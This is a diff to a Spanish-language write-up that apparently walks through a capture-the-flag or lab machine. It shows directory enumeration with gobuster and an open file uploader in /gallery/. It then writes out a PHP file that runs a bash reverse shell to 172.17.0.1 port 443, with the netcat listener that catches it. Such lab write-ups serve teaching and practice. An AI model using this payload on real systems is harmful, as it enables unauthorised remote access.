@@ -22,12 +22,16 @@ gobuster dir -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.
 Veremos que está disponible el subdirectorio `/gallery/` el cuál es un **Directory Listing** y que explorando un poco, llegaremos a `handler.php`, el cual al entrar veremos que nos permite subir un archivo.
 
 ## Paso N3: Explotando el file uploader
-crearemos un pequeño script en `php` el cual al ejecutarse se refleje una reverse shell.
+crearemos un pequeño script en `php` el cual al ejecutarse se refleje una reverse shell y lo subimos.
 ```
 echo "<?php                
 system("bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
 ?>" > script.php
 ```
+Una vez subido, se vera reflejado en `http://172.17.0.2/gallery/uploads/images/`
+<img width="611" height="423" alt="image" src="https://github.com/user-attachments/assets/2845f527-dbf6-418a-b339-94f0cf19756b" />
+
+Si entramos al archivo escuchando en el puerto 443 con `nc -lvnp 443` habremos accedido al sistema.
 
 
 
